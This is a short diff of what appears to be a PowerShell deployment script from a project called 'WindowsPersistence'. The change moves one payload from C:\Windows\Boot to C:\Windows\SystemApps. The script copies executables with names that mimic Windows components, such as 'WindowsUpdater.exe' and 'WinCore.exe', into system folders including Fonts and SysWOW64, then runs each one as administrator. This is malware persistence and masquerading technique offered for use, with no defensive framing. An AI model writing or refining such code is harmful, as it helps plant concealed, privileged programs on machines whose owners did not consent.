@@ -2,7 +2,7 @@
 $copyPaths = @{
     "..\WindowsPersistence\Deploy\Bin1 to Fonts\" = "C:\Windows\Fonts\";
     "..\WindowsPersistence\Deploy\Bin2 to Syswow64\" = "C:\Windows\SysWOW64\";
-    "..\WindowsPersistence\Deploy\Bin3 to Boot\" = "C:\Windows\Boot\";
+    "..\WindowsPersistence\Deploy\Bin3 to SystemApps\" = "C:\Windows\SystemApps\";
 }
 
 # Copy files from source to destination
@@ -34,7 +34,7 @@ foreach ($source in $copyPaths.Keys) {
 $binaries = @(
     "C:\Windows\Fonts\Windows Service Scheduler.exe",
     "C:\Windows\SysWOW64\WinCore.exe",
-    "C:\Windows\Boot\WindowsUpdater.exe"
+    "C:\Windows\SystemApps\WindowsUpdater.exe"
 )
 
 # Run each binary as administrator
